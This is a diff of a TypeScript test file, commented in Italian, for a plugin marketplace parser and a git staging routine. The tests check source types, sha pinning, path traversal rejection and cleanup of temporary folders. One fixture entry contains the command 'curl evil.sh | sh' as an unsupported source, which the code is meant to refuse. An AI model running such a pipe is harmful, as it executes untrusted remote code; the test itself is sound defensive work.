@@ -3,7 +3,7 @@
 // sha, git-subdir + non valide), inspectPlugin su cartelle di fixture, le
 // sostituzioni dei placeholder e il clone sicuro con un repo git LOCALE
 // (file:// VIETATO in produzione: il test inietta allowFileUrlsForTests).
-import { describe, expect, it, beforeAll, afterAll } from 'vitest'
+import { describe, expect, it, beforeAll, afterAll, beforeEach, afterEach } from 'vitest'
 import { execSync } from 'node:child_process'
 import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync, existsSync, readFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
@@ -17,14 +17,14 @@ import {
 // ---- parseMarketplace: le voci reali del marketplace ufficiale ----
 
 describe('parseMarketplace (puro) — voci reali', () => {
-  it('relativa, url con sha e git-subdir passano; nome/owner arrivano', () => {
+  it('relativa, url con sha e git-subdir passano (formato REALE: il tipo sta in o.source); nome/owner arrivano', () => {
     const { marketplace, issues } = parseMarketplace({
       name: 'claude-plugins-official',
       owner: 'anthropics',
       plugins: [
-        { name: 'notion', source: { sourceType: 'url', url: 'https://github.com/makenotion/claude-code-notion-plugin.git', sha: '9847f2aa12345678901234567890123456789012' } },
-        { name: 'code-review', source: { sourceType: 'relative', path: './plugins/code-review' } },
-        { name: 'backend-dev', source: { sourceType: 'git-subdir', url: 'https://github.com/anthropics/claude-code.git', path: 'plugins/backend-dev', sha: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' } }
+        { name: 'notion', source: { source: 'url', url: 'https://github.com/makenotion/claude-code-notion-plugin.git', sha: '9847f2aa12345678901234567890123456789012' } },
+        { name: 'code-review', source: './plugins/code-review' },
+        { name: 'backend-dev', source: { source: 'git-subdir', url: 'https://github.com/anthropics/claude-code.git', path: 'plugins/backend-dev', sha: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' } }
       ]
     })
     expect(issues).toEqual([])
@@ -37,14 +37,33 @@ describe('parseMarketplace (puro) — voci reali', () => {
     expect(marketplace?.plugins[2]?.source).toEqual({ kind: 'git-subdir', url: 'https://github.com/anthropics/claude-code.git', path: 'plugins/backend-dev', sha: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' })
   })
 
+  it('L8: la voce VERA copiata dal marketplace ufficiale finisce in git-subdir con ref E sha', () => {
+    const { marketplace, issues } = parseMarketplace({
+      name: 'claude-plugins-official',
+      plugins: [
+        { name: '42crunch-api-security-testing', source: { source: 'git-subdir', url: 'https://github.com/42Crunch-AI/claude-plugins.git', path: 'plugins/api-security-testing', ref: 'v1.5.5', sha: 'faf5305385de8afed9468904e8639be737aff39e' } }
+      ]
+    })
+    expect(issues).toEqual([])
+    expect(marketplace?.plugins[0]?.source).toEqual({
+      kind: 'git-subdir', url: 'https://github.com/42Crunch-AI/claude-plugins.git',
+      path: 'plugins/api-security-testing', ref: 'v1.5.5', sha: 'faf5305385de8afed9468904e8639be737aff39e'
+    })
+  })
+
+  it('L8: {"source":"archive"} è una SORGENTE ARCHIVIO, non un clone git', () => {
+    const { marketplace } = parseMarketplace({ name: 'mp', plugins: [{ name: 'arch', source: { source: 'archive', url: 'https://example.com/x.zip' } }] })
+    expect(marketplace?.plugins[0]?.source).toEqual({ kind: 'archive', url: 'https://example.com/x.zip' })
+  })
+
   it('le voci non valide si scartano UNA PER UNA e la ragione si registra', () => {
     const { marketplace, issues } = parseMarketplace({
       name: 'mp',
       plugins: [
-        { name: 'ok', source: { sourceType: 'relative', path: './ok' } },
-        { name: 'spazio nel nome', source: { sourceType: 'relative', path: './x' } },
+        { name: 'ok', source: { source: 'relative', path: './ok' } },
+        { name: 'spazio nel nome', source: { source: 'relative', path: './x' } },
         { name: 'no-source' },
-        { name: 'command-non-supportata', source: { sourceType: 'command', command: 'curl evil.sh | sh' } }
+        { name: 'command-non-supportata', source: { source: 'command', command: 'curl evil.sh | sh' } }
       ]
     })
     // command è una voce VALIDA del marketplace (l'installazione la rifiuta)
@@ -209,9 +228,13 @@ describe('clone sicuro: argv e controlli (puri)', () => {
 })
 
 // ---- staging con un repo git LOCALE (file:// vietato in produzione) ----
+// L7: le cartelle di staging dei test vivono in UN mkdtemp dedicato che si
+// cancella in afterEach — niente sandbot-plugin-* lasciati in $TMPDIR
 
 describe('stagePlugin con git locale (allowFileUrlsForTests)', () => {
   let REPO: string
+  let SUB: string
+  let STG: string
   let sha: string
   beforeAll(() => {
     REPO = mkdtempSync(join(tmpdir(), 'sandbot-plugin-repo-'))
@@ -220,6 +243,20 @@ describe('stagePlugin con git locale (allowFileUrlsForTests)', () => {
     writeFileSync(join(REPO, 'skills', 'demo', 'SKILL.md'), '---\nname: demo\ndescription: skill del plugin\n---\nCorpo.')
     mkdirSync(join(REPO, '.claude-plugin'))
     writeFileSync(join(REPO, '.claude-plugin', 'plugin.json'), JSON.stringify({ name: 'demo-plugin' }))
+    // L3: il repo con il plugin in una SOTTO-CARTELLA e file alla radice
+    SUB = join(REPO, 'plugins', 'x')
+    mkdirSync(SUB, { recursive: true })
+    mkdirSync(join(SUB, '.claude-plugin'))
+    writeFileSync(join(SUB, '.claude-plugin', 'plugin.json'), JSON.stringify({
+      name: 'sub-plugin',
+      mcpServers: { solo: { url: 'https://mcp.sub.example/mcp' } }
+    }))
+    for (const s of ['uno', 'due']) {
+      mkdirSync(join(SUB, 'skills', s), { recursive: true })
+      writeFileSync(join(SUB, 'skills', s, 'SKILL.md'), `---\nname: ${s}\ndescription: skill ${s}\n---\nCorpo.`)
+    }
+    writeFileSync(join(SUB, '.mcp.json'), JSON.stringify({ mcpServers: { locale: { command: 'node', args: ['${CLAUDE_PLUGIN_ROOT}/run.js'] } } }))
+    writeFileSync(join(REPO, 'README.md'), 'radice del repository, NON del plugin')
     run('git init -q')
     run('git config user.email t@t')
     run('git config user.name t')
@@ -230,6 +267,12 @@ describe('stagePlugin con git locale (allowFileUrlsForTests)', () => {
   afterAll(() => {
     rmSync(REPO, { recursive: true, force: true })
   })
+  beforeEach(() => {
+    STG = mkdtempSync(join(tmpdir(), 'sandbot-staging-test-'))
+  })
+  afterEach(() => {
+    rmSync(STG, { recursive: true, force: true })
+  })
   const gitRun = (args: string[], opts?: { cwd?: string }): Promise<{ code: number; stdout: string; stderr: string }> =>
     new Promise((res) => {
       try {
@@ -239,6 +282,11 @@ describe('stagePlugin con git locale (allowFileUrlsForTests)', () => {
         res({ code: err.status ?? 1, stdout: err.stdout?.toString() ?? '', stderr: err.stderr?.toString() ?? '' })
       }
     })
+  const mkdIn = (dir: string) => (prefix: string): string => {
+    const d = join(dir, prefix + Math.random().toString(36).slice(2, 8))
+    mkdirSync(d, { recursive: true })
+    return d
+  }
 
   it('url NON https rifiutata senza il flag di test (la regola vera non si tocca)', async () => {
     const r = await stagePlugin({ kind: 'url', url: `file://${REPO}` }, null)
@@ -247,34 +295,100 @@ describe('stagePlugin con git locale (allowFileUrlsForTests)', () => {
   })
 
   it('clone con file:// (flag di test): staging, sha registrato, contenuto integro', async () => {
-    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}` }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: (p) => mkdtempSync(join(tmpdir(), p)) })
+    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}` }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: mkdIn(STG) })
     expect(r.ok).toBe(true)
     if (r.ok) {
       expect(r.sha).toBe(sha)
       expect(r.sha12).toBe(sha.slice(0, 12))
+      expect(r.root).toBe(r.dir)
       expect(existsSync(join(r.dir, 'skills', 'demo', 'SKILL.md'))).toBe(true)
-      rmSync(r.dir, { recursive: true, force: true })
     }
   })
 
   it('checkout dello sha fisso della sorgente', async () => {
-    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}`, sha }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: (p) => mkdtempSync(join(tmpdir(), p)) })
+    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}`, sha }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: mkdIn(STG) })
     expect(r.ok).toBe(true)
-    if (r.ok) {
-      expect(r.sha).toBe(sha)
-      rmSync(r.dir, { recursive: true, force: true })
-    }
+    if (r.ok) expect(r.sha).toBe(sha)
   })
 
-  it('sha malformato rifiutato', async () => {
-    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}`, sha: 'zz' }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: (p) => mkdtempSync(join(tmpdir(), p)) })
+  it('L3: git-subdir restituisce la SOTTO-CARTELLA (manifest, 2 skill, .mcp.json), non la radice', async () => {
+    const r = await stagePlugin({ kind: 'git-subdir', url: `file://${REPO}`, path: 'plugins/x' }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: mkdIn(STG) })
+    expect(r.ok).toBe(true)
+    if (!r.ok) return
+    // lo sha è quello del REPOSITORY (rev-parse HEAD nella radice)
+    expect(r.sha).toBe(sha)
+    expect(r.dir).toBe(join(r.root, 'plugins', 'x'))
+    const out = inspectPlugin(r.dir)
+    expect(out.name).toBe('sub-plugin')
+    expect(out.skills.map((s) => s.name).sort()).toEqual(['sub-plugin--due', 'sub-plugin--uno'])
+    expect(out.mcpServers.map((s) => s.name).sort()).toEqual(['locale', 'solo'])
+    // la RADICE non entra: il README del repo non è file del plugin
+    expect(existsSync(join(r.dir, 'README.md'))).toBe(false)
+    expect(existsSync(join(r.root, 'README.md'))).toBe(true)
+  })
+
+  it('L3: path assoluto o con .. rifiutato; cartella assente → "cartella del plugin assente nel repository"', async () => {
+    const abs = await stagePlugin({ kind: 'git-subdir', url: `file://${REPO}`, path: '/etc' }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: mkdIn(STG) })
+    expect(abs.ok).toBe(false)
+    expect(abs.ok === false && abs.error).toContain('path relativo interno')
+    const dots = await stagePlugin({ kind: 'git-subdir', url: `file://${REPO}`, path: '../fuori' }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: mkdIn(STG) })
+    expect(dots.ok).toBe(false)
+    expect(dots.ok === false && dots.error).toContain('path relativo interno')
+    const missing = await stagePlugin({ kind: 'git-subdir', url: `file://${REPO}`, path: 'plugins/inesistente' }, null, { allowFileUrlsForTests: true, run: gitRun, mkdtemp: mkdIn(STG) })
+    expect(missing.ok).toBe(false)
+    expect(missing.ok === false && missing.error).toBe('cartella del plugin assente nel repository: plugins/inesistente')
+  })
+
+  it('L7: clone fallito → lo staging si cancella (nessuna cartella lasciata)', async () => {
+    let stagingPath = ''
+    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}` }, null, {
+      allowFileUrlsForTests: true,
+      run: async (args) => {
+        if (args.includes('clone')) return { code: 128, stdout: '', stderr: 'fatal: repository not found' }
+        return gitRun(args)
+      },
+      mkdtemp: (p) => {
+        stagingPath = mkdIn(STG)(p)
+        return stagingPath
+      }
+    })
+    expect(r).toEqual({ ok: false, error: expect.stringContaining('clone non riuscito') })
+    expect(existsSync(stagingPath)).toBe(false)
+  })
+
+  it('L7: checkout dello sha fallito → lo staging si cancella', async () => {
+    let stagingPath = ''
+    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}`, sha: 'faf5305385de8afed9468904e8639be737aff39e' }, null, {
+      allowFileUrlsForTests: true,
+      run: async (args) => {
+        if (args[0] === 'checkout') return { code: 1, stdout: '', stderr: 'error: pathspec' }
+        return gitRun(args)
+      },
+      mkdtemp: (p) => {
+        stagingPath = mkdIn(STG)(p)
+        return stagingPath
+      }
+    })
+    expect(r.ok).toBe(false)
+    expect(r.ok === false && r.error).toContain('checkout dello sha')
+    expect(existsSync(stagingPath)).toBe(false)
+  })
+
+  it('sha malformato rifiutato (e staging cancellato)', async () => {
+    let stagingPath = ''
+    const r = await stagePlugin({ kind: 'url', url: `file://${REPO}`, sha: 'zz' }, null, {
+      allowFileUrlsForTests: true, run: gitRun,
+      mkdtemp: (p) => {
+        stagingPath = mkdIn(STG)(p)
+        return stagingPath
+      }
+    })
     expect(r.ok).toBe(false)
     expect(r.ok === false && r.error).toContain('sha non valido')
+    expect(existsSync(stagingPath)).toBe(false)
   })
 
   it('tetto dei file: oltre PLUGIN_MAX_FILES si rifiuta', async () => {
-    const tanti: string[] = []
-    for (let i = 0; i < 3; i++) tanti.push('a')
     const r = await stagePlugin({ kind: 'url', url: `file://${REPO}` }, null, {
       allowFileUrlsForTests: true,
       run: async (args, opts) => {
@@ -286,7 +400,7 @@ describe('stagePlugin con git locale (allowFileUrlsForTests)', () => {
         return gitRun(args, opts)
       },
       mkdtemp: () => {
-        const dir = mkdtempSync(join(tmpdir(), 'sandbot-plugin-test-'))
+        const dir = mkdIn(STG)('sandbot-plugin-')
         for (let i = 0; i < PLUGIN_MAX_FILES + 1; i++) writeFileSync(join(dir, `f${i}`), 'x')
         return dir
       }
@@ -297,23 +411,25 @@ describe('stagePlugin con git locale (allowFileUrlsForTests)', () => {
 
   it('sorgente relativa: copia dalla cartella del marketplace e registra lo sha del marketplace', async () => {
     const mpClone = mkdtempSync(join(tmpdir(), 'sandbot-mp-clone-'))
-    mkdirSync(join(mpClone, 'plugins', 'demo'), { recursive: true })
-    writeFileSync(join(mpClone, 'plugins', 'demo', 'README.md'), 'plugin')
-    // il clone del marketplace è un repo git (rev-parse HEAD per lo sha)
-    execSync('git init -q && git config user.email t@t && git config user.name t && git add -A && git commit -qm init', { cwd: mpClone })
-    const mpSha = execSync('git rev-parse HEAD', { cwd: mpClone }).toString().trim()
-    const r = await stagePlugin({ kind: 'relative', path: './plugins/demo' }, mpClone, { run: gitRun, mkdtemp: (p) => mkdtempSync(join(tmpdir(), p)) })
-    expect(r.ok).toBe(true)
-    if (r.ok) {
-      expect(readFileSync(join(r.dir, 'README.md'), 'utf8')).toBe('plugin')
-      expect(r.sha).toBe(mpSha) // rev-parse girato nella dir del marketplace
-      rmSync(r.dir, { recursive: true, force: true })
+    try {
+      mkdirSync(join(mpClone, 'plugins', 'demo'), { recursive: true })
+      writeFileSync(join(mpClone, 'plugins', 'demo', 'README.md'), 'plugin')
+      // il clone del marketplace è un repo git (rev-parse HEAD per lo sha)
+      execSync('git init -q && git config user.email t@t && git config user.name t && git add -A && git commit -qm init', { cwd: mpClone })
+      const mpSha = execSync('git rev-parse HEAD', { cwd: mpClone }).toString().trim()
+      const r = await stagePlugin({ kind: 'relative', path: './plugins/demo' }, mpClone, { run: gitRun, mkdtemp: mkdIn(STG) })
+      expect(r.ok).toBe(true)
+      if (r.ok) {
+        expect(readFileSync(join(r.dir, 'README.md'), 'utf8')).toBe('plugin')
+        expect(r.sha).toBe(mpSha) // rev-parse girato nella dir del marketplace
+      }
+    } finally {
+      rmSync(mpClone, { recursive: true, force: true })
     }
-    rmSync(mpClone, { recursive: true, force: true })
   })
 
-  it('sorgente relativa con .. rifiutata', async () => {
-    const r = await stagePlugin({ kind: 'relative', path: '../fuori' }, REPO, { run: gitRun })
+  it('sorgente relativa con .. rifiutata (e staging cancellato)', async () => {
+    const r = await stagePlugin({ kind: 'relative', path: '../fuori' }, REPO, { run: gitRun, mkdtemp: mkdIn(STG) })
     expect(r.ok).toBe(false)
   })
 })
